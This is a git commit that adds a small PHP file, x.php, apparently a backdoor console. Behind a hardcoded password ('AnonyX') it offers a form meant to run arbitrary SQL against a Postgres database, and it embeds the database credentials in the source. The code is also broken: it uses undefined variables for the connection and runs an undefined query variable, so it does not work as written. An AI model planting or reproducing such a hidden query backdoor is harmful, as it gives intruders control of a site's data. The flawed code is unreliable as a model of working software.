25aac35f722d9ec7e2e99aa8f0de51aa486c874c
Muhammad Ubaii Dillah <31325580+Ubaii@users.noreply.github.com>
2021-01-20 16:08:25 +0700

    Create x.php

---
+++ x.php
@@ -0,0 +1,37 @@
+<?php
+
+@session_start();
+
+define('DBHOST', '127.0.0.1');
+define('DBUSER', 'postgres');
+define('DBNAME', 'postgres');
+define('DBPASS', '@arikcs@');
+
+if($conn = new PDO("pgsql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass)){
+	if(isset($_SESSION['queryMgr'])){
+		if(isset($_POST['gasquery'])){
+			if($conn->query($queryMgr)){
+				echo 'ok';
+			}else{
+				echo 'gagal.';
+			}
+		}else{
+			echo '<form method="post" action=""><input name="gasquery" type="text">';
+		}
+	}else{
+		if(isset($_POST['login'])){
+			$login = $_POST['login'];
+			if($login == 'AnonyX'){
+				$_SESSION['queryMgr'] = $login;
+			}else{
+				echo ':(';
+			}
+		}else{
+			echo '<form method="post" action=""><input name="login" type="password">';
+		}
+	}
+}else{
+	echo 'koneksi gagal.';
+}
+
+?>
